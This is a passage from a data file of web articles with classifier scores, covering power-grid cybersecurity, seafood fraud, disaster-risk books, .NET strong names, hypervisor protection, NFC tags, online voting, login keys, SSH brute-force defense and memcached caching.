more of an effect on the power grid than computer intrusion. Nevertheless, both Weiss and EPRI's Kropp believe that the final report is right to place more emphasis on cybersecurity than software reliability. \"You don't try to look for something that's going to occur very, very, very infrequently,\" says Weiss. \"Essentially, a blackout like this was something like that. There are other issues that are higher probability that need to be addressed.\" Software bug contributed to blackout IT Failures In The Great US Blackout Sparks over US power grid cybersecurity NCSP drafts secure code guidelines Cyber security alliance sets sights on Washington Leeds Uni, MS teach undergrads to write secure code",
        "prob": "tensor([[2.0988e-06, 1.0000e+00]])"
    },
    {
        "text": "A Boston Globe study of over a hundred Boston-area seafood restaurants found that 48 percent of the fish was mislabeled. When asked about the discrepancies, some restaurant owners shrugged saying that everyone does it. The most common kinds of fraud are mislabeling a fish as wild when it’s not, such as salmon, or selling a completely different fish than the one named, for instance selling a rockfish as a red snapper. In the high priced world of caviar from threatened sturgeon, fraud exists on several levels, from directly misrepresenting the fish as farmed when it’s actually wild to counterfeit labels on the fish or the caviar tins. Seafood fraud not only cheats consumers but it could also adversely affect catch data that form the basis of sustainable fisheries management. In some cases, seafood fraud could undermine healthy choices. Consumer reports found many samples labeled as grouper were in fact tilefish, which contains much more mercury than grouper. The Food and Drug Administration recommends that pregnant women, women of child bearing age, and children avoid eating tilefish because of high levels of mercury. Government agencies that have the authority to enforce rules around seafood fraud have not made it a priority. While an estimated 86 percent of all the seafood that Americans consume is imported, the FDA inspects less than about two percent of it. One of the challenges to combating seafood fraud, aside from the lack of DNA testing out in the field and slack government agencies, is the supply chain. Seafood often changes hands repeatedly from net to consumer. Determining where the fraud begins can be difficult. 3 things you can do to fight seafood fraud: 1. Buy whole fish. 2. Be wary of very inexpensive seafood. 3. Ask questions: Where was this fish caught? Is it in season? Other great ways you can make a difference. LINKS & VIDEOS Seafood Fraud Overview – Oceana Caviar Caveats – Science News Mystery Fish – Consumer Reports Feds to Fight Massive Fraud in Seafood Sizes – Huff Post Don’t Be Fooled – Fresh Buyer Beware: Wild Salmon Scams Run Rampant, Randy Hartnell, Vital Choice Blog Fish as Food in an Age of Globalization, University of British Columbia Bait and Switch: How Seafood Fraud Hurts Our Oceans, Our Wallets, and Our Health, Oceana Trade Secrets: Renaming and Mislabeling of Seafood, University of British Columbia Government Falls Short on Seafood Inspections, Food and Water Watch How Seafood Fraud Works, Boston Globe Fish is often mislabeled along the supply chain from hook to fork. Hake Hoax: Fish in Spain Not Always What Label Says Hake is Spain’s most popular fish, but consumers aren’t always getting what they think they are buying. A scientific study conducted by the International Center for Investigative Journalists found that almost one in 10 fish purchased at markets in Spain were mislabeled. Fish Fraud: CBS Report The non-profit group, Oceana reports that nearly one in three fish purchased is mislabeled. CBS News contributor Katie Lee investigates seafood fraud and tells consumers what to look out for.",
        "prob": "tensor([[2.9280e-06, 1.0000e+00]])"
    },
    {
        "text": "Sustainability issues grow as large urban centers add a million people, or or up to about 5%, per year. Social responses to acts of nature need to be tempered in order to prevent environmental disasters. Demand increases for tech solutions. Automation extends to robotics and space. Recent links (about 23): ai “The Age of Assistants”: The View From Inside SRI augmented-reality “What Mountain is That?” New App Takes AR Outside the City Limits Database | EM-DAT International Strategy for Disaster Reduction International Strategy for Disaster Reduction (ISDR) Death to Humans! Visions of the Apocalypse in Movies and Literature: Scientific American email HOW TO: Undo “Send” in Gmail events Online Event Registration â€“ Sell Tickets Online with Eventbrite robotics IEEE Spectrum: Cyborg Fly Pilots Robot Through Obstacle Course security David Ignatius – Pentagon’s cybersecurity plans have a Cold War chill smartgrid IEEE Spectrum: $25 Billion European Smart Grid Market by 2020 space BBC News – Alien hunters ‘should look for artificial intelligence’ ui Make: Online : Multitouch robot swarm controller World’s Fastest-Growing Megalopolis Hides in Fog | Raw File Reinventing the City to Combat Climate Change visualization David McCandless: The beauty of data visualization | Video on TED.com Urban Risk Reduction: An Asian Perspective, Shaw et al, 2009 Urbanization is outpacing general population growth in Asia. Case studies are described for localities and types of environmental disaster. Urban issues range from household, community, city, region, to nation. Lifestyles create hazards which induce, or worsen natural, events. The culture can be built on safety and resilience. Action planning may require assistance of specialized agencies. Pilot cities demonstrate projects such as local resource organization, citizen empowerment, and smaller units and chain of command. Lessons are learned from disaster recovery. A management information system was useful in at least one case. The decision-making pyramid includes global, national, city, building, and individual. Environmental issues include air and water pollution, waste and sewage, noise, land use, drainage and transport congestion, slums, flood and other common issues such as disease, fire, or crime. Strategies are sensitive to survival, peace, innovation from tradition, and sustainability. The disaster management cycle has its own information and communication issues in each phase, non, before, during and after. Risk reduction involves knowledge, perception, deepening, preparedness and dissemination. Surveys measure public awareness. Frameworks are provided by Millennium Development Goal, Hyogo Framework for Action, and UN International Strategy for Disaster Reduction. There are eighteen chapters, two parts, twenty-four authors. Disaster Risk Management Systems Analysis: A Guide Book, Baas, 2008 This book has a toolset for the characterization and strengthening of DRM at the international, national, province/district/municipality, community and institution layers. A framework enumerates initiatives for each of the periods for disaster risk reduction, response, and recovery. Preparedness links both development, through mitigation and prevention, and humanitarian assistance, through relief and recovery. Another framework for sustainable livelihoods indicates which households are most vulnerable. There is a list of key questions for leaders. A form is shown to document the strengths, weaknesses, opportunities and threats across levels. There are six modules, two annexes and many figures, relational maps, and checklists. It can be downloaded as a PDF from the web. Ecological Engineering: Principles and Practices, Patrick C. Kangas, 2004 Humans stress natural ecosystems through simplification of species and metabolic shifts. Research in emergent ecosystems includes agriculture, urban, and coastal or estuarine. Since prediction is limited, engineering epistemology requires building improvement based on design and test. Future directions include ecological nanotech, terraforming, biosensors, ecosensors, universal pollution treatment, and aquaculture. Technoecosystems maintain a balance between living and hardware systems. Since the laboratory includes the environment, the hacker code of ethics applies to ecological engineering. Treatment reduces costs of pollution. Ecological economics adds measures of emergy or embodied energy, natural capital, sustainability, carrying capacity and many types of ecosystem services to improve life-support value. Sold waste management discusses landfills, composting, and industrial ecology. The energy value of the waste is the same as that used to make the product. Wetlands are used for wastewater treatment by spiraling. An identical decay equation for decomposition evolved in parallel, linking design intuitions for both biodegradation in ecology and wastewater engineering. Restoration ecology connects to succession and is explained for salt marshes, artificial reefs, and educational exhibits. Microcosmology includes living models and replication issues. Soil bioengineering is shown for urban imperviousness, stormwater management bioretention and agricultural erosion control. This realm includes beavers, coastal vegetation and self-building machines. Biodiversity is increased by exotic species. The food web describes feeding interactions. The series of multiple states in catastrophe theory is used to explain invasion. Control theory ranges from machine analogies to biotech. Circuit symbols are used for ecosystem models. H T Odum coined a lot of the names of new ecosystems. Principles include energy signature, self-organization and preadaptation. There are nine chapters Building Safer Cities: The Future of Disaster Risk, edited by Kreimer et al, 2003 Actual and new types of disasters are discussed, e.g. due to rapid urbanization or climate change. Impact and preparedness affect several geographic scales of security, environmental and human, including economics. politics, and society. There are several major worldviews. The main concerns are globalization, environment, social vulnerability, and protecting infrastructure. The various methods of balancing costs of risks include privatization, government taxation and globalization. Africa often suffers export losses, which leads to tens of thousands of youth mortalities, when other countries have disasters. Hazard reduction involves robust design, flexible and adaptable systems, reversal of vulnerability trends, and societal preparedness. Coastal zone classifications include protect, retreat and accommodate. Resilience measures how much disturbance can be absorbed, and the capability for self-reorganization. Regional analysis, management and action are required for flooding. Study approaches include scenarios and consequences. The fact that life support networks, e.g. utilities, affect eachother as external technological causes has not been taken into account traditionally. Critical infrastructure includes telecom, power, energy, storage, transportation, water, financial, emergency services, and government. Buildings can be retrofit using new tech for earthquakes risk. These were papers for a conference of international financial institutions. There are four parts, twenty chapters, twenty-six authors. They may develop literacy for the terminology. Most chapters have conclusions or recommendations. The web had PDFs and Google books has full content. Counting Heads, David Marusek, 2005 This novel is a scifi cyberpunk mystery. There are three parts, forty-five chapters, and an epilogue. Chapters are numbered, e.g. up to 1.3 or 2.29. Part 3 adds days of the week to the titles up to Friday 3.13. It begins in first person for part 1 which was originally a short story. The year is 2092. There are a pair of main characters. Tech includes nanotech, clones, robotic insects, friendly AIs, wearable valet processors. holopresence conferences, and high velocity surface travel. HomCom is the initial antagonist. There is a realistic world. The rest of the parts are told in third person after forty years have passed. The point of view changes among several main characters. The antagonist may be an AI. A glossary would be appropriate. The title refers to heads for which the body can be replaced. A sequel was published, Mind Over Ship.",
        "prob": "tensor([[0.0172, 0.9828]])"
    },
    {
        "text": "If you liked the post, Share on Facebook, Tweet and Google Plus (use buttons above). You can also Subscribe to our feed via Email for free. Computer Forensics as a Career Computer forensics also known as Cyber Forensics or Digital Forensics is pertaining to legal evidence found in computers & digital storage media. Computer forensics is the analysis done to collect evidence during crime investigations to detect illegal or unauthorized activities or frauds which are done using computers and internet. Demand For Computer Forensics Although computer forensics is relatively a new field, Computer forensics experts have been in high demand for jobs since this field first appeared few years back(around 1985), but that demand is growing even larger as both government security agencies and private firms are recruiting cyber investigators in a huge amount. We know that cyber crimes like Identity Theft, Email Hacking, Child Pornography, Cyber-stalking, Copyright infringement, Spamming, Cyber terrorism etc. are on a rise. Due to this dark side of internet, various companies are hiring computer forensics experts to root out the cyber criminals. The scope of computer analysic can vary from simple information retrieval to reconstructing a series of events. Although it is mostly associated with the investigation of a wide variety of computer crime, computer forensics may also be used in civil proceedings. Generally speaking, there are huge differences between the salaries of public sector forensic examiners(Government employed) and private sector forensic examiners. The average annual salary of someone working in this field ranges from $40,000 to $100,000. Also note that salary pay scales may differ in different countries. To start a computer forensics career, you will likely need a computer forensics degree or a related degree (e.g., computer science, criminal justice or engineering). Post-degree certification may help you to get recruited quickly. Technical and analytical skills are must for all computer forensics careers. Knowledge and technical skills in vast range of computer storage devices, operating systems, programming languages and software applications gives more opportunities. If you have obtained degree qualification or certified training which is recognized internationally, you have the privileges to work in any country as you like. It is easy for you to get job offers wherever you go. You may need knowledge in following things to become a successful computer cyber investigator: - Computer networking & routing - Communication protocols and security - Reverse engineering - Computer forensics tools such as: - Password crackers - Forensic Toolkit (FTK) software applications - PTK Forensics - The Sleuth kit - The Coroners Toolkit - Selective file dumper Computer forensics is a very challenging and exciting career which provides great self satisfaction. So get ready to become a computer forensics analyst and make your future brighter.",
        "prob": "tensor([[2.0488e-06, 1.0000e+00]])"
    },
    {
        "text": "Strong Name (further referred to as \"SN\") is a technology introduced with the .NET platform and it brings many possibilities into .NET applications. But many .NET developers still see Strong Names as security enablers (which is very wrong!) and not as a technology uniquely identifying assemblies. There is a lot of misunderstanding about SNs (as we could see in the article \"Building Security Awareness in .NET Assemblies : Part 3 - Learn to break Strong Name .NET Assemblies this article attempts to clear those up. Now let's see what SNs are, what we can use them for and how they work. Strong Name is a technology based on cryptographic principles, primary digital signatures; basic idea is presented in the figure At the heart of digital signatures is asymmetric cryptography (RSA, EL Gamal), together with hashing functions (MD5, SHA). So what happens when we want to sign any data? I'll try to explain what happens in the figure above. First we must get a public/private key pair (from our administrator, certification authority, bank, application etc.) that we will use for encryption/decryption. Then DATA (term DATA represents general data we want to sign) is taken and run through some hashing algorithm (like MD5 or SHA - however, MD5 is not recommended) and hash of DATA is produced. The hash is encrypted by private key of user A and attached to plaintext data. The DATA and attached signature are sent to user B who takes public key of user A and decrypts attached signature where hash of DATA is stored and encrypted. Finally user B runs DATA through the same hashing algorithm as user A and if both hashes are the same then user B can be pretty sure that the DATA has not been tampered with and also identity of user A is proven. But this is a naive scenario because it's hard to securely deliver public keys over insecure communication channels like Internet. That is why certificates were introduced but I will not cover it here because certificates aren't used in SNs and delivery of public key is a matter of publisher's policy (maybe I can cover distribution of public keys, certificates and certification authorities in another article). Now let's assume that public key was delivered to user B This process is used in the creation of SN for .NET applications. You can translate term DATA as assemblies and apply the same steps to them when SNs are used. But what is the purpose and usage of this SN technology? Simple - there is the only one reason – to uniquely identify each assembly. See section 188.8.131.52 of CLI ECMA specification where SNs are defined: This header entry points to the strong name hash for an image that can be used to deterministically identify a module from a referencing point (Section 184.108.40.206). SNs are not any security enhancement; they enable unique identification and side-by-side code execution. Now we know that SNs are not security enablers. Where to use them then? We can see two scenarios where SNs can be used: Versioning solves known problem called as \"DLL hell\". Signed assemblies are unique and SN solves problem with namespace collisions (developers can distribute their assemblies even with the same file names as shown of figure below). Assemblies signed with SNs are uniquely identified and are protected and stored in different spaces. In addition to collision protection, SN should help developers to uniquely identify versions of their That is why when developers want to use GAC (Global Assembly Cache) assemblies must be signed to separate each publisher's namespace and to separate each version. The second important feature of Strong Names is authentication; a process where we want to ensure ourselves about the code's origin. This can be used in many situations, such as assigning higher permissions for chosen publishers (as will be shown later) or ensuring that code is provided by a specific supplier. It has been shown that signatures and public keys can be easily removed from assemblies. Yes, that is right but it is correct behavior even when we use digital signatures in emails or anywhere else! Let's see how it works! We can use some analogy from our real life. Let's assume you are a boss of your company and you are sending an email to your employees where new prices of your products are proposed. This email is a plaintext and you use some non-trusted outsourcing mailing services. Your communication can be easily monitored and your email can be easily accessed by unauthorized persons who can change its content, for instance your prices proposed in email. How to solve that? The answer is cryptography, again digital signatures that you can use to authenticate to your employees and to verify content of your email. Simply you have to add a digital signature to your email and then require your employees will trust just verified emails that have your valid digital signature. Let's assume that all PKI infrastructure is set up and working correctly. Now, when an intruder removes the digital signature from your email, his employees will not trust them because they can't be verified and application will alert users about this insecure The same situation is when SNs are used. You can remove SNs from assemblies , but this makes no sense because just as in the case of emails, assemblies without SNs can't be trusted when environment is set up to require those digital signatures or SNs. This is also related to another very important point in .NET – Code Groups & Policy Levels. As in the case of emails, when PKI is setup in a company and security policy is defined that employees can't trust and verify emails which are not signed or where the encrypted hash value is different from hashed plaintext content. The same can be done with .NET Framework using the .NET Configuration tool on each machine or by group policy for large networks. This tool provides configuration options for .NET Framework including Runtime Security where policy levels and code groups can be set. Policy levels work on intersection principle as shown in the figure below Code groups (inside of those policy levels) provide permission sets for applications that belong to them according to their evidence (origin, publisher, strong name etc.). The assembly will get those permissions based on the intersection of code groups from each policy level applicable to it. This is a very important improvement in security architecture and improves the traditional Windows security model that is process centric (see figure below). .NET introduces Code Access Security (CAS) which is used to identify the origin of code and assign to it specific restrictions and then make security policy more granular and protecting against attacks such as luring attacks. However my intention isn't to describe CAS or Windows security internals (I can write about it in other articles) but show SN principles. Let's move back to it! Now we can move to the second use for SN - administrators and developers can use SNs together with code groups to provide assemblies with higher permissions (not the default ones that assembly will acquire according to default .NET Framework settings). Let's see an example! I must point out that this is just a simplified example how SN can identify publisher, this is NOT a way to obey CLR security or how to use it in enterprise environment. That is why please try to understand the example as a general principle available with SNs but NOT as a design pattern! Usage of SNs as authentication is a more complex problem and there are many non-trivial issues when SNs are involved. But it's out of scope of this article, so now back to the sample! Take my sample Windows Forms project and rebuild it and put .exe file on any share on your LAN. Then try to start this application from this share and click on button – what happens? A security exception is raised because application doesn't have enough privileges. Now go to .NET Configuration tool and add a new code group add new code group called Test and in the second dialog choose Strong name, click on Import button and locate the .exe file in Debug folder of project folder and finally assign full trust for this application Now you have created a new code group containing just your sample application. Now go to your network share and try to start sample application again. And it works! Why? Because it belongs to our new code group Test with full trust permissions. Now remove SN from sample application (as described in his article or just simply remove attribute [assembly: AssemblyKeyFile(\"KeyFile.snk\")] from AssemblyInfo.cs file), recompile and publish it on share. Try to run it and what happens? It's not working! Why? Because assembly can't show this strong name evidence and it belongs to the default code group (with limited It's not surprising, nothing special, no magic – just correct usage of Strong Name technology. SNs are easy and powerful but we have to understand how and where to use them. That is why I want to outline some \"issues\" that are connected with SNs that will present all capabilities that we can expect from SNs. So what are the weaknesses of SNs? First we have to realize that SNs are a lightweight version of Authenticode and they provide fast and easily used technology to get enterprise features like versioning and authentication. But this ease of use must be paid by something and here goes a list of - It can be very hard to securely associate publisher with his public key when certification authorities are not involved. Publisher must ship his public key by himself and he must ensure that public key is not tampered. Without certification authorities it's impossible to do it securely when our products are distributed over insecure channels and there are no other ways to verify the publisher's public key. - There is no way how to revoke public key when the private key has been compromised. As this is easily done in case of certificates (just publish revoked certificates on CRL, Certificate Revocation List) in case of SNs, revocation is a nightmare. Just imagine that you as a junior security engineer has lost USB key with your private key used to sign your assemblies. Then you'll have to call and email your clients with newly signed assemblies, give them your new public key and setup all environments again). There is no automatic way like CRL, everything must be done \"by hand\". Authenticode can be considered as more powerful from an enterprise and architectural perspective. So why not use Authenticode instead of SNs? Here are the reasons: - SNs don't require any third party (such as Verisign) to create signatures and manage public keys. Any developer can easily create and manage his keys (see chapter \"Generate key pair with sn.exe tool\" in my free book \".NET in Samples\") without payment to any third party. - SNs can avoid network connections and PKI involvement so applications can run and be verified even when network connections are not - Authenticode certificates are not a part of assembly names and that is why they can't separate publisher's namespaces like SNs do. Do you remember the statement from ECMA in the beginning? That SNs should \"deterministically identify\" modules and this is the most important reason. So not a security enabler but unique identification is the primary reason for SNs! And Authenticode is not designed for this purpose! I hope this helps you understand the strong name technology in the .NET Framework, and helped you see that it is very powerful, but with defined limits. It is a technology that should be used appropriately. With SNs we can uniquely identify an assembly and run side-by-side our assemblies. Security scenarios are not recommended to be used with Strong Names (even when it's supported by .NET Framework), just in case you are advanced in security and working with certificates and key management. There are many design patterns on how to use Strong Names and all this depends on application architecture, client requirements and infrastructure settings (Active Directory, PKI etc.). There could be much more written about it (like usage of SNs in large companies, problems with key distribution, etc.), but this was not intended for this article, it was just a reaction to some misinterpretation of this technology and the article is intended to put it right.",
        "prob": "tensor([[7.3830e-06, 9.9999e-01]])"
    },
    {
        "text": "A team of researchers has come up with a way to stop malicious code from spreading from one virtual machine to the hypervisor and from there to other virtual machines. The researchers from North Carolina State University said that their \"hypersafe\" technology could protect virtualised system against this kind of threat, known as \"virtual machine escape\". The team's research is set to be presented in a paper called HyperSafe: A Lightweight Approach to Provide Lifetime Hypervisor Control-Flow Integrity on 18 May at the thirty-first IEEE Symposium. While such virtual machine risks remain largely theoretical, the fear of them is holding back wider adoption of technologies such as cloud computing, according to assistant professor of computer science Xuxian Jiang and PhD student Zhi Wang, the developers of the technology. Cloud computing routinely relies on virtualisation to host the computing capacity of multiple customers on the same physical system, raising the possibility that a compromise of a virtual machine belonging to one customer could spread to those of other customers. The software developed by Jiang and Wang, called HyperSafe, aims at stopping such attacks by protecting the integrity of the hypervisor, they said. It uses two techniques to ensure this integrity: non-bypassable memory lockdown and restricted pointer indexing. The first relies on security features built into modern processors to lock down the memory range that includes executable code, according to the researchers. The effect is to protect the hypervisor's code and static data from being compromised, even in the presence of exploitable memory corruption bugs such as buffer overflows, they said. New code can only be introduced by the hypervisor administrator. The second technique — restricted pointer indexing — creates an initial profile of the hypervisor's normal behaviour, and then prevents any deviation from that profile. \"Restricted pointer indexing introduces one layer of indirection to convert the control data into pointer indexes,\" Jiang and Wang wrote in the paper. \"These pointer indexes are restricted such that the corresponding call/return targets strictly follow the hypervisor control flow graph, hence expanding protection to control-flow integrity.\" Only the hypervisor administrators can introduce changes to the hypervisor code, according to Jiang. So far the HyperSafe code developed by Jiang and Wang works with the BitVisor and Xen hypervisors, but the researchers said it could be adapted for other Type-I, bare-metal hypervisors such as VMware ESX and Microsoft Hyper-V. In its current form the hypervisor code would need to be modified to work with HyperSafe, the researchers said. They said they currently have no plans to commercialise the project, but are open to working with software vendors. HyperSafe was developed with funding from the US Army Research Office and the National Science Foundation. Commercial vendors have also begun to recognise the importance of security for pushing cloud adoption. In January, for instance, Cisco, VMware and NetApp announced a three-way partnership and a new architecture for secure, multi-tenant cloud datacentres. The Secure Multi-tenancy Design Architecture (SMDA) works across existing products from the three companies to isolate the IT resources and applications of different clients or business units that share a common cloud infrastructure.",
        "prob": "tensor([[2.0468e-06, 1.0000e+00]])"
    },
    {
        "text": "Phones Gain Ability to Learn by Touching NEW YORK (AP) - There’s a form of extra-sensory perception called psychometry, whose practitioners claim to learn things about objects by touching them. Smartphones set to be released this month by Samsung and Sony will have some of that ability: they’ll learn things when you touch them to pre-programmed \"tags.\" For example, you can program a tag with your phone number, and stick it on your business card. When someone taps the phone to the card, the phone would call you. Or you can put a tag on your night stand. Place the phone there, and it goes into \"alarm clock\" mode, holding your calls until the morning. Samsung Electronics Co. announced this week that it will be selling these tags in the form of stickers it calls \"TecTiles\" - $15 for 5 of them. They’ll work with its new flagship Samsung Galaxy S III smartphone, set to launch in a few weeks, and several others already in the market, including the HTC EVO 4G LTE sold by Sprint Nextel. Sony Corp.’s Xperia Ion, to be released June 24, will come with the ability to read different coin-like plastic tags that read \"Home,\" ’’Office\" and so forth. The tags cost $20 for four, and the phone can be programmed to react differently to each tag. The \"Car\" tag can launch a navigation application, for instance. Tapping \"Home\" can send a text message to the rest of the family that you’re home, and set the ringer volume to maximum. The big push behind the technology, which is known as Near-Field Communications, comes from companies that see the phone as the wallet of the future. When touched to payment terminals, NFC-equipped phones can act as credit or debit cards. But turning phones into credit cards is a tall order. Mobile payments already work with a few phones, but broad adoption is being held up while cellphone companies, banks, payment processors and retailers work out who pays for what and who benefits. This ability to sense things close by is made possible by a new type of communications hardware in phones, complementing long-range cellular radios, medium-range Wi-Fi and short-range Bluetooth. The latest version of Google Inc.’s Android software, known as Ice Cream Sandwich, comes with the ability to use NFC to communicate from phone to phone. When the backs are tapped together, the owners can trade information like contacts. Samsung takes this one step further with the Galaxy S III. Tap two phones together, and they set up a connection via Wi-Fi. That means the owners can walk away from each other, and as long as they’re in the same room or so, they can transfer photos and even hefty video files between their phones. There are issues to work out. The Samsung tags can be read by most Android phones that have NFC capability, but not the Sony phone. Samsung and HTC phones won’t recognize the Sony tags. Apple Inc., whose iPhones are trendsetters in many ways, hasn’t built NFC into them - yet. Its patent filings hint at an interest in NFC, but they’ve given no clue when the technology might show up in iPhones. Nick Holland, an analyst with Yankee Group, believes NFC will shine first in non-payment applications, because they’re easier to sort out, and the technology has many uses. There have been NFC trials in Sweden, using phones as hotel room keys, he points out. Another compelling use case would be Wi-Fi hotspots. A cafe that wants to limit access to the local hotspot might let patrons tap their phones against a tag instead of having them laboriously enter a password. \"There’s been an over-focus on the wallets,\" Holland said. \"It’s a technology that’s not designed purely for payments.\" For advertisers, NFC tags could replace the so-called \"QR\" codes - two-dimensional bar codes that need to be photographed with specially downloaded software to be deciphered, so they can send a consumer to the advertiser’s website or earn them a coupon for a discount. QR codes work at a distance, unlike NFC tags, but have significant drawbacks. \"Someone described them as ’digital vomit’ recently. You can’t make them look pretty,\" Holland said. Each NFC tag includes a tiny chip, which explains the relatively high prices Samsung and Sony are charging. Those prices will come down, Holland said, as adoption rises. QR codes, of course, have the advantage of being very cheap, since they can be created on a simple printer. The big makers of NFC chips are NXP Semiconductors N.V., a Dutch company, and Inside Secure, a French one. But competition is looming, Holland said, from bigger chip companies like Broadcom Corp. and Texas Instruments Inc. \"Basically, anyone who’s making chips is looking at NFC as a new area they could move into,\" Holland said.",
        "prob": "tensor([[0.0139, 0.9861]])"
    },
    {
        "text": "is popular among young people. Voting, however, is not popular among young people. Participating in politics is important. Those who don't vote must watch while politicians divvy up the available money and services without their input. What better way to use technology is there than to enable more young people to vote and be politically aware? of voting online isn't new; it's similar to voting by mail except that the ballots are submitted via keystroke rather than via the Postal Service. There are concerns that people with more wealth and better education--who tend to use the Internet in greater numbers--would skew online elections. However, the point is missed that, due to the present election structure, richer people already have a disproportionate say in who is elected. cannot add any more weight to a seesaw that already has one side on the ground, but it can induce more people to participate. Already, dozens of candidates and organizations have Web sites with much more in-depth information than any 30-second commercial can include. from the Knight-Ridder News Service included the point that \"Californians could be voting over the Internet in five years with a computerized system that could revolutionize the state's voting process and boost sagging voter turnout. of State Bill Jones is recruiting Silicon Valley's high-tech companies to study how to make such a system private and secure from fraud. Momentum is already building nationwide from a pilot project that would let some overseas military personnel cast votes over the Internet in the November 2000 election.\" is already under development. Again, modifying the secure servers that have enabled e-commerce to flourish in the last few years will allow honest elections to be held online. Janelle Brown, technology correspondent for Salon, said in an interview that the necessary technology could be available within the next five companies are working on election server technology including Votehere, which was profiled in the New York Times this spring. \"As president of Votehere.net, a start-up company that builds secure Internet voting systems, Jim Adler hears the same question from investors again and again. They don't ask about politics or security. They want to know what would happen if Microsoft moved into the election business. Adler has a ready reply: 'Do you think the Justice Department would let Microsoft run elections in this country?' are focusing their efforts on building the trust of election officials in their products and reputations. Votehere.net is new to the industry, but most of these companies are already in the election business, selling voting machines and computer equipment for reading ballot results, and they are anticipating demand for Internet concern with online voting boils down to trust. Kim Alexander, president of the non-profit California Voter Foundation, said that personal, not technical, issues were the key stumbling block toward acceptance of online voting. \"A CVF survey showed that members were supportive with caution,\" Alexander said in an interview. \"I see online voting supplementing polling places. It will be a generation before there is more confidence. The state should provide more information to ease fears.\" \"There is little trust in what is online,\" she said. \"There is a lack of familiarity. People don't trust interaction with a machine. It's not something they're familiar with.\" comes to using a computer to vote, Brown predicted that people will initially be reticent, but it will pass with time. Brown nor Alexander believed that the Democrats or the Republicans would be helped or hurt by Internet voting. Alexander ventured that more independent voters might participate. described a school of thought that believes \"voting should be difficult.\" That thinking certainly is consistent with America's voting history, starting with the Constitution, which permitted only white, middle-aged men with property to vote. Therefore, it is odd that critics of Internet voting cite a lack of access as an issue. From grandfather clauses to literacy tests to poll taxes, suffrage has expanded only slowly and grudgingly. even more reason to provide more opportunity to express their views. The technology, when it is available, must be allowed to operate effectively. Education, not fear, must be the impetus behind improving political participation. thanks to Kim Alexander and Janelle Brown for their time and assistance. taken from \"Californians might soon be voting online\" an article by Deborah Kong, Knight-Ridder News Service, dated Aug. 8, 1998. taken from \"Casting Ballots Through the Internet\" an article by Rebecca Fairley Raney, New York Times on the Web, dated May 3, © 2000 Tyson Chaney All Rights Reserved is executive director of the Millennium 3 Foundation, a non-profit, non-partisan political research and education organization. He is writing a book, Millennium 3: Political Theory in the Twenty-First Century, that will be published later this year. discuss this article on our discussion",
        "prob": "tensor([[0.1774, 0.8226]])"
    },
    {
        "text": "One Ring to Log In All The YubiKey is a device that adds a layer of security to logging into online accounts. Google engineers are experimenting with YubiKeys and other schemes for added protection. CREDIT: From \"YubiKey NEO - World's first NFC enabled one-time password tokenM\" by Yubico on YouTube Google is working on small devices — including one designed as a ring — that people would need to log onto all of their online accounts, Wired reported. Such devices could add a layer of security to online email, banking and other accounts, but they could also add another necessity for people to carry around in their purses or wallets. Google's security team are experimenting with extra log-in hardware because they thought passwords aren't enough to deter hackers anymore, Wired reported. Because of the increasing sophistication of hacks, everything that is now password-protected might in the future require some kind of personal key, too, the Google researchers thought. Google has experimented with YubiKey, a small card that plugs into computers' USB ports. They also imagined that tomorrow's Internet keys could be built into rings or smartphones, which would eliminate the need to carry around an extra device. The jewelry and smartphone-based keys could work with a tap. One of the major challenges now is to convince other websites to agree to a unified log-in system. Google's ideas for increasing the security of online accounts are alternatives to another popular idea, adding biometrics such as iris or fingerprint scans to people's personal devices.",
        "prob": "tensor([[2.0596e-06, 1.0000e+00]])"
    },
    {
        "text": "But what if an attacker doesn't care about getting access to a specific system? After all, trying 10,000 passwords against a server would most likely cause a target account to be locked out. Instead, a malicious hacker could attempt password attacks on a large scale, using the same username and password combination on 10,000 systems. That would result in only one failed log-in attempt per server, but a much better chance of successfully compromising at least one. Lately, attackers have been using the \"low and slow\" tactic, employing botnets against large numbers of servers. The technique gives them the ability to launch large-scale attacks from multiple sources. Defending against these SSH brute-force attacks means going back to the basics of solid security practices. To start, utilize passwords and passphrases that will not be easily guessed. Doing standard \"Leetspeak\" -- an Internet language that substitutes letters with ASCII characters -- will not work. Attackers now use custom dictionaries that incorporate the common Leet substitutions used by sysadmins, like \"@\" for \"a\" and \"3\" for \"e.\" Also, make the root password inaccessible via a direct SSH connection by setting 'DenyUsers root' and 'PermitRootLogin no' in your sshd_config file. The majority of password attacks I've seen lately have been against the root account on systems. This was first published in January 2009",
        "prob": "tensor([[2.0179e-06, 1.0000e+00]])"
    },
    {
        "text": "Distributed Caching with Memcached Memcached is a high-performance, distributed caching system. Although application-neutral, it's most commonly used to speed up dynamic Web applications by alleviating database load. Memcached is used on LiveJournal, Slashdot, Wikipedia and other high-traffic sites. For the past eight years I've been creating large, interactive, database-backed Web sites spanning multiple servers. Approximately 70 machines currently run LiveJournal.com, a blogging and social networking system with 2.5 million accounts. In addition to the typical blogging and friend/interest/profile declaration features, LiveJournal also sports forums, polls, a per-user news aggregator, audio posts by phone and other features useful for bringing people together. Optimizing the speed of dynamic Web sites is always a challenge, and LiveJournal is no different. The task is made all the more challenging, because nearly any content item in the system can have an associated security level and be aggregated into many different views. From prior projects with dynamic, context-aware content, I knew from the beginning of LiveJournal's development that pregenerating static pages wasn't a viable optimization technique. It's impossible due to the constituent objects' cacheability and lifetimes being so different, so you make a bunch of sacrifices and waste a lot of time precomputing pages more often than they're requested. This isn't to say caching is a bad thing. On the contrary, one of the core factors of a computer's performance is the speed, size and depth of its memory hierarchy. Caching definitely is necessary, but only if you do it on the right medium and at the right granularity. I find it best to cache each object on a page separately, rather than caching the entire page as a whole. That way you don't end up wasting space by redundantly caching objects and template elements that appear on more than one page. In the end, though, it's all a series of trade-offs. Because processors keep getting faster, I find it preferable to burn CPU cycles rather than wait for disks. Modern disks keeping growing larger and cheaper, but they aren't getting much faster. Considering how slow and crash-prone they are, I try to avoid disks as much as possible. LiveJournal's Web nodes are all diskless, Netbooting off a common yet redundant NFS root image. Not only is this cheaper, but it requires significantly less maintenance. Of course, disks are necessary for our database servers, but there we stick to fast disks with fast RAID setups. We actually have ten different database clusters, each with two or more machines. Nine of the clusters are user clusters, containing data specific to the users partitioned among them. One is our global cluster with non-user data and the table that maps users to their user clusters. The rationale for independent clusters is to spread writes. The alternative is having one big cluster with hundreds of slaves. The difficulty with such a monolithic cluster is it only spreads reads. The problem of diminishing returns appears as each new slave is added and increasingly is consumed by the writes necessary to stay up to date. At this point you can see LiveJournal's back-end philosophy: Avoid disks: they're a pain. When necessary, use only fast, redundant I/O systems. Scale out, not up: many little machines, not big machines. My definition of a little machine is more about re-usability than cost. I want a machine I can keep using as long as it's worth its space and heat output. I don't want to scale by 